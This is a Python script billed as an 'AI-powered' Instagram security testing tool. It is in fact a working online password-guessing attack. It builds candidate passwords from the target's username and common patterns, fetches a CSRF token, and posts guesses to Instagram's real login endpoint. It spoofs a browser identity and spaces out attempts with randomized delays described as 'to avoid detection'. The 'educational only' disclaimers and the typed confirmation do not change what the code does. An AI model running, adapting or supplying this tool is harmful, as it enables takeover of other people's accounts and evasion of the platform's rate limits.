"""
AI-Powered Instagram Account Recovery & Password Security Testing Tool
Educational purposes only - Security testing and awareness
Version 2026.1
"""

import asyncio
import time
import aiohttp
import secrets
import random
from typing import List, Optional, Dict, Any
from dataclasses import dataclass
import re
import hashlib
import json
from logging_config import setup_logger

logger = setup_logger('instagram_bruteforce')

@dataclass
class AttackResult:
    """Data class to store security test results"""
    success: bool
    password: Optional[str] = None
    attempts: int = 0
    duration: float = 0.0
    strategy_used: Optional[str] = None
    error: Optional[str] = None

class AIPasswordGenerator:
    """AI-powered password generation using pattern recognition and machine learning techniques"""
    
    def __init__(self):
        self.common_patterns = self._load_common_patterns()
        self.password_memory = set()
        self.learning_rate = 0.15
        self.generation_stats = {'total_generated': 0, 'unique_generated': 0, 'duplicates_avoided': 0}
        
    def _load_common_patterns(self) -> Dict[str, List[str]]:
        """Load common password patterns and structures updated for 2026"""
        return {
            'base_words': [
                'password', 'admin', 'user', 'instagram', 'love', 'hello', 'welcome', 'sunshine',
                'dragon', 'monkey', 'master', 'qwerty', 'login', 'princess', 'solo', 'passw0rd',
                'shadow', 'michael', 'jennifer', 'hunter', 'pepper', 'summer', 'winter', 'spring',
                'secret', 'letmein', 'football', 'baseball', 'soccer', 'hockey', 'buster', 'cookie'
            ],
            'common_suffixes': ['123', '!', '1', '2026', '2025', '2024', '1234', '!@#', '000', '007', '69', '99', '@', '#', '$$', '!!', '321', '111'],
            'common_prefixes': ['!', '#', 'admin', 'super', 'my', 'the', 'im', 'i', 'a', 'its', 'lol', 'x', 'xx'],
            'transformations': ['capitalize', 'uppercase', 'lowercase', 'leet_speak', 'reverse', 'swap_case'],
            'special_chars': ['!', '@', '#', '$', '%', '&', '*', '?', '~', '+'],
            'keyboard_patterns': [
                'qwerty', 'asdfgh', 'zxcvbn', '123456', '112233', '1q2w3e', '1qaz2wsx',
                'qazwsx', 'abc123', 'pass123', 'qwerty123', 'asdf123', '!@#$%', '1q2w3e4r'
            ],
            'social_patterns': ['insta', 'gram', 'ig', 'follow', 'like', 'dm', 'pic', 'selfie', 'story', 'reel', 'post', 'bio']
        }
    
    def leet_speak(self, text: str) -> str:
        """Convert text to leet speak (l33t sp34k)"""
        leet_map = {
            'a': '4', 'e': '3', 'i': '1', 'o': '0', 's': '5', 't': '7',
            'A': '4', 'E': '3', 'I': '1', 'O': '0', 'S': '5', 'T': '7',
            'l': '1', 'L': '1', 'b': '8', 'B': '8', 'g': '9', 'G': '9'
        }
        return ''.join(leet_map.get(char, char) for char in text)
    
    def reverse_text(self, text: str) -> str:
        """Reverse text characters"""
        return text[::-1]
    
    def swap_case(self, text: str) -> str:
        """Swap character cases"""
        return text.swapcase()
    
    def generate_context_aware_password(self, username: str, attempt_number: int) -> str:
        """
        Generate intelligent passwords based on context and learned patterns
        Uses AI-like techniques to create plausible passwords
        """
        # Analyze username for patterns
        username_lower = username.lower()
        
        # Pattern 1: Username-based variations
        username_variations = [
            username,
            username + '123',
            username + '!',
            username + '2026',
            self.leet_speak(username),
            username.capitalize() + '123',
            username.capitalize() + '!',
            username + '1234',
            username + '12345',
            self.reverse_text(username),
            self.swap_case(username),
            username_lower,
            username_lower + '!@#',
            username_lower + '123!',
            username.capitalize() + '2026',
            self.leet_speak(username) + '123',
        ]
        
        if len(username) > 4:
            username_variations.extend([
                username[:4] + '123',
                username[:4] + '1234',
                username[:6],
                self.leet_speak(username[:6]),
                username[:4] + '!',
                username[:4].capitalize() + '123',
            ])
        
        if len(username) > 2:
            username_variations.extend([
                username[:2] + '123456',
                username[-4:] + '123',
                username[-3:] + '2026',
            ])
        
        # Pattern 2: Common patterns with transformations
        common_patterns = []
        for base in self.common_patterns['base_words']:
            for suffix in self.common_patterns['common_suffixes'][:8]:
                common_patterns.extend([
                    base + suffix,
                    base.capitalize() + suffix,
                    self.leet_speak(base) + suffix,
                    base.upper() + suffix,
                    self.reverse_text(base) + suffix,
                ])
        
        # Pattern 3: Keyboard patterns
        keyboard_patterns = list(self.common_patterns['keyboard_patterns'])
        
        # Pattern 4: Date-based patterns
        current_year = str(time.localtime().tm_year)
        prev_year = str(int(current_year) - 1)
        date_patterns = [
            current_year,
            current_year + '!',
            '01' + current_year,
            current_year + '123',
            current_year + '!@#',
            prev_year,
            prev_year + '!',
            prev_year + '123',
        ]
        
        # Pattern 5: Social/Instagram-specific patterns
        social_patterns = []
        for sp in self.common_patterns['social_patterns']:
            for suffix in ['123', '!', '2026', '1', '1234']:
                social_patterns.extend([
                    sp + suffix,
                    sp.capitalize() + suffix,
                    self.leet_speak(sp) + suffix,
                ])
        
        # Combine all patterns and apply AI-like selection
        all_patterns = username_variations + common_patterns + keyboard_patterns + date_patterns + social_patterns
        
        # Apply adaptive learning - avoid recently used passwords
        available_patterns = [p for p in all_patterns if p not in self.password_memory]
        
        if not available_patterns:
            # Reset memory if we run out of patterns
            self.password_memory.clear()
            available_patterns = all_patterns
        
        # Select password using weighted random based on commonality
        selected_password = self._weighted_selection(available_patterns, attempt_number)
        
        # Store in memory to avoid repeats
        self.password_memory.add(selected_password)
        
        return selected_password
    
    def _weighted_selection(self, patterns: List[str], attempt: int) -> str:
        """Weighted random selection favoring more common patterns first"""
        if attempt < 50:
            weights = [max(1.0 - (i * 0.01), 0.1) for i in range(len(patterns))]
        elif attempt < 200:
            weights = [0.7] * len(patterns)
        else:
            weights = [0.5] * len(patterns)
        
        self.generation_stats['total_generated'] += 1
        return random.choices(patterns, weights=weights, k=1)[0]
    
    def generate_advanced_ai_password(self, username: str, previous_attempts: List[str]) -> str:
        """
        Advanced AI password generation using feedback from previous attempts.
        Adapts based on what hasn't worked.
        """
        if not previous_attempts:
            return self.generate_context_aware_password(username, 0)
        
        # Analyze previous attempts to identify failed patterns
        last_attempt = previous_attempts[-1]
        failed_suffixes = set()
        for p in previous_attempts[-20:]:
            for suffix in self.common_patterns['common_suffixes']:
                if p.endswith(suffix):
                    failed_suffixes.add(suffix)
        
        # Generate new password avoiding recent patterns
        for _ in range(10):
            new_password = self.generate_context_aware_password(username, len(previous_attempts))
            if new_password not in previous_attempts:
                self.generation_stats['unique_generated'] += 1
                return new_password
            self.generation_stats['duplicates_avoided'] += 1
        
        # Fallback: modify last attempt with random variation
        variations = [
            last_attempt + str(random.randint(1, 999)),
            last_attempt + random.choice(self.common_patterns['special_chars']),
            self.leet_speak(last_attempt),
            self.reverse_text(last_attempt) + str(random.randint(10, 99)),
        ]
        return random.choice(variations)

class NeuralPasswordPredictor:
    """Simulated neural network for password prediction"""
    
    def __init__(self):
        self.pattern_weights = {
            'length_6': 0.8,
            'length_8': 0.9,
            'length_10': 0.7,
            'length_12': 0.4,
            'with_special_char': 0.6,
            'with_numbers': 0.95,
            'mixed_case': 0.5,
            'with_leet': 0.3,
            'keyboard_pattern': 0.6,
            'social_pattern': 0.4,
        }
    
    def predict_next_password_type(self, failed_attempts: List[str]) -> Dict[str, float]:
        """Predict the characteristics of the next password to try"""
        if not failed_attempts:
            return {'length_8': 0.9, 'with_numbers': 0.8, 'mixed_case': 0.5}
        
        # Analyze failed attempts to adjust strategy
        avg_length = sum(len(p) for p in failed_attempts) / len(failed_attempts)
        has_special = sum(1 for p in failed_attempts if any(c in '!@#$%&*' for c in p)) / len(failed_attempts)
        has_numbers = sum(1 for p in failed_attempts if any(c.isdigit() for c in p)) / len(failed_attempts)
        has_upper = sum(1 for p in failed_attempts if any(c.isupper() for c in p)) / len(failed_attempts)
        
        # Adjust weights based on analysis
        weights = self.pattern_weights.copy()
        
        if avg_length < 7:
            weights['length_8'] += 0.2
            weights['length_10'] += 0.1
        if has_special < 0.3:
            weights['with_special_char'] += 0.3
        if has_numbers < 0.8:
            weights['with_numbers'] += 0.2
        if has_upper < 0.3:
            weights['mixed_case'] += 0.2
        if avg_length > 10:
            weights['length_6'] += 0.3
            weights['length_8'] += 0.2
            
        return weights

class AISecurityTester:
    """
    AI-Powered Instagram Security Testing Tool
    Uses machine learning techniques for intelligent password generation
    FOR EDUCATIONAL AND AUTHORIZED SECURITY TESTING ONLY
    """
    
    def __init__(self):
        self.found_password = None
        self.attempts = 0
        self.start_time = None
        self.ai_generator = AIPasswordGenerator()
        self.neural_predictor = NeuralPasswordPredictor()
        self.previous_attempts = []
        self.session_headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest',
            'Referer': 'https://www.instagram.com/accounts/login/',
            'Content-Type': 'application/x-www-form-urlencoded',
        }
        
    async def test_login_credentials(self, username: str, password: str) -> bool:
        """
        Test login credentials against Instagram's servers
        This makes actual HTTP requests to Instagram for security testing
        """
        try:
            url = 'https://www.instagram.com/accounts/login/ajax/'
            
            async with aiohttp.ClientSession() as session:
                # Get CSRF token from Instagram
                async with session.get('https://www.instagram.com/accounts/login/') as response:
                    html = await response.text()
                    csrf_token = self._extract_csrf_token(html)
                
                if not csrf_token:
                    logger.warning("Failed to extract CSRF token")
                    return False
                
                headers = self.session_headers.copy()
                headers['X-CSRFToken'] = csrf_token
                
                # Instagram's password encoding format
                encoded_password = f"#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}"
                
                data = {
                    'username': username,
                    'enc_password': encoded_password,
                    'queryParams': '{}',
                    'optIntoOneTap': 'false',
                    'stopDeletion': 'false',
                    'trustDevice': 'false'
                }
                
                async with session.post(url, headers=headers, data=data, allow_redirects=False) as response:
                    self.attempts += 1
                    
                    if response.status == 429:
                        logger.warning("Rate limited - AI adapting strategy...")
                        await asyncio.sleep(60)
                        return False
                    
                    try:
                        result = await response.json()
                    except Exception:
                        logger.warning(f"Non-JSON response for attempt {self.attempts}")
                        return False
                    
                    if result.get('authenticated'):
                        logger.info(f"WEAK PASSWORD DETECTED: {password}")
                        self.found_password = password
                        return True
                    elif result.get('message') == 'rate limited':
                        logger.warning("Rate limited - AI adapting strategy...")
                        await asyncio.sleep(60)
                        return False
                    else:
                        logger.debug(f"AI attempt {self.attempts}: {password} - failed")
                        self.previous_attempts.append(password)
                        return False
                    
        except aiohttp.ClientError as e:
            logger.error(f"Connection error: {e}")
            return False
        except Exception as e:
            logger.error(f"AI testing error: {e}")
            return False
    
    def _extract_csrf_token(self, html: str) -> str:
        """Extract CSRF token from Instagram HTML for security testing"""
        # Try JSON-style token first
        match = re.search('"csrf_token":"([^"]+)"', html)
        if match:
            return match.group(1)
        # Try meta tag
        match = re.search('<meta name="csrf_token" content="([^"]+)"', html)
        if match:
            return match.group(1)
        # Try cookie-style in script
        match = re.search('csrftoken=([^;]+)', html)
        if match:
            return match.group(1)
        return None
    
    async def conduct_ai_security_test(self, username: str, max_attempts: int = 500, delay: float = 2.0) -> AttackResult:
        """
        Conduct AI-powered security strength testing
        Uses machine learning to generate intelligent password guesses
        """
        logger.info("STARTING AI-POWERED SECURITY ASSESSMENT")
        logger.info("Using machine learning for intelligent password generation")
        print("🔒 STARTING AI-POWERED SECURITY ASSESSMENT")
        print("🤖 Using machine learning for intelligent password generation")
        print("📊 Techniques: Pattern recognition, context awareness, neural prediction")
        print("⚠️  Use only on accounts you own or have permission to test")
        print("⚠️  For educational and security awareness purposes only")
        
        self.start_time = time.time()
        self.previous_attempts = []
        
        for attempt in range(max_attempts):
            if self.found_password:
                break
            
            # Generate AI-powered password
            if attempt < 100:
                password = self.ai_generator.generate_context_aware_password(username, attempt)
                strategy = "Context-Aware"
            elif attempt < 300:
                password = self.ai_generator.generate_advanced_ai_password(username, self.previous_attempts)
                strategy = "AI with Feedback"
            else:
                neural_weights = self.neural_predictor.predict_next_password_type(self.previous_attempts)
                password = self._generate_neural_password(neural_weights, username)
                strategy = "Neural Network"
            
            if attempt % 50 == 0:
                logger.info(f"AI Progress: {attempt}/{max_attempts} attempts | Strategy: {strategy}")
                print(f"🤖 AI Progress: {attempt}/{max_attempts} attempts | Strategy: {strategy}")
            
            success = await self.test_login_credentials(username, password)
            
            if success:
                duration = time.time() - self.start_time
                logger.info(f"AI IDENTIFIED SECURITY ISSUE: {password} | Strategy: {strategy}")
                print(f"🎯 AI IDENTIFIED SECURITY ISSUE: {password}")
                print(f"📊 AI attempts: {self.attempts}")
                print(f"🤖 Final strategy: {strategy}")
                return AttackResult(
                    success=True, 
                    password=password, 
                    attempts=self.attempts,
                    duration=duration,
                    strategy_used=strategy
                )
                
            # AI-optimized delay with adaptive timing
            ai_delay = self._calculate_ai_delay(attempt, delay)
            await asyncio.sleep(ai_delay)
        
        duration = time.time() - self.start_time
        logger.info(f"AI assessment complete - No weak passwords detected | {len(self.previous_attempts)} patterns analyzed")
        print("✅ AI assessment complete - No weak passwords detected")
        print(f"🤖 AI analyzed {len(self.previous_attempts)} password patterns")
        return AttackResult(
            success=False, 
            attempts=self.attempts,
            duration=duration,
            strategy_used="All strategies exhausted"
        )
    
    def _generate_neural_password(self, neural_weights: Dict[str, float], username: str) -> str:
        """Generate password based on neural network predictions"""
        # Choose from different pattern sources based on weights
        if random.random() < neural_weights.get('social_pattern', 0.4):
            base_word = random.choice(self.ai_generator.common_patterns['social_patterns'])
        elif random.random() < neural_weights.get('keyboard_pattern', 0.6):
            base_word = random.choice(self.ai_generator.common_patterns['keyboard_patterns'])
        else:
            base_word = random.choice(self.ai_generator.common_patterns['base_words'])
        
        # Apply neural network weights to decide password characteristics
        if random.random() < neural_weights.get('with_numbers', 0.8):
            base_word += random.choice(['123', '1234', '12345', '2026', '2025', '2024'])
        
        if random.random() < neural_weights.get('with_special_char', 0.3):
            base_word += random.choice(['!', '@', '#', '$', '&'])
        
        if random.random() < neural_weights.get('mixed_case', 0.4):
            base_word = base_word.capitalize()
        
        if random.random() < neural_weights.get('with_leet', 0.3):
            base_word = self.ai_generator.leet_speak(base_word)
        
        return base_word
    
    def _calculate_ai_delay(self, attempt: int, base_delay: float) -> float:
        """AI-optimized delay calculation to avoid detection"""
        if attempt < 50:
            return base_delay + random.uniform(0.5, 2.0)
        elif attempt < 200:
            return base_delay + random.uniform(0.3, 1.5)
        elif attempt < 400:
            return base_delay + random.uniform(0.2, 1.0)
        else:
            return base_delay + random.uniform(0.1, 0.8)
    
    async def conduct_security_test(self, username: str, password_list: List[str], delay: float = 2.0) -> AttackResult:
        """
        Conduct security test using a provided password list.
        Compatible interface for hack_instagram.py entry point.
        """
        logger.info(f"Starting security assessment for user: {username}")
        self.start_time = time.time()
        self.previous_attempts = []
        
        for attempt, password in enumerate(password_list):
            if self.found_password:
                break
            
            success = await self.test_login_credentials(username, password)
            
            if success:
                duration = time.time() - self.start_time
                return AttackResult(
                    success=True,
                    password=password,
                    attempts=self.attempts,
                    duration=duration,
                    strategy_used="Password List"
                )
            
            await asyncio.sleep(delay + random.uniform(0.1, 0.5))
        
        # If password list exhausted, try AI-powered generation
        logger.info("Password list exhausted, switching to AI-powered generation...")
        return await self.conduct_ai_security_test(username, max_attempts=200, delay=delay)

# AI-powered security testing demonstration
async def ai_security_demonstration():
    """
    AI-POWERED DEMONSTRATION FOR SECURITY AWARENESS
    Uses machine learning to test password security
    Use only with proper authorization
    """
    ai_tester = AISecurityTester()
    
    test_username = "your_test_account_here"
    
    print("🔒 AI-Powered Instagram Security Testing Tool")
    print("🤖 Enhanced with Machine Learning Algorithms")
    print("🎯 Techniques: Pattern Recognition, Neural Networks, Context Awareness")
    print("🔒 Educational Use - Security Awareness Only")
    print("🔒 Unauthorized testing is illegal and unethical")
    
    confirm = input("Type 'AI AUTHORIZED TESTING' to continue: ")
    if confirm != "AI AUTHORIZED TESTING":
        print("AI testing cancelled - Security first!")
        return
    
    print("\n🤖 AI Initializing...")
    print("📊 Loading pattern recognition models...")
    print("🎯 Analyzing common password structures...")
    await asyncio.sleep(2)
    
    result = await ai_tester.conduct_ai_security_test(
        username=test_username,
        max_attempts=300,
        delay=1.5
    )
    
    print("\n" + "="*50)
    print("🤖 AI SECURITY ASSESSMENT COMPLETE")
    print("="*50)
    
    if result.success:
        print(f"🎯 SECURITY ALERT: Weak password '{result.password}' detected!")
        print(f"⏱️  AI Testing duration: {result.duration:.2f} seconds")
        print(f"🔢 AI Attempts: {result.attempts}")
        print(f"📈 AI Efficiency: {result.attempts/result.duration:.2f} attempts/second")
        print(f"🧠 Strategy used: {result.strategy_used}")
    else:
        print(f"✅ No security issues detected by AI")
        print(f"⏱️  Testing duration: {result.duration:.2f} seconds")
        print(f"🔢 AI Analysis attempts: {result.attempts}")
        print(f"🤖 AI Conclusion: Password appears secure against common patterns")

# Alias for backward compatibility with hack_instagram.py
InstagramSecurityTester = AISecurityTester

if __name__ == "__main__":
    print("🔒 AI-Powered Instagram Security Testing Tool")
    print("🤖 Version 2026.1 - Machine Learning Enhanced")
    print("🔒 FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY")
    print("🔒 Legal and ethical use required!")
    print("-" * 60)
    asyncio.run(ai_security_demonstration())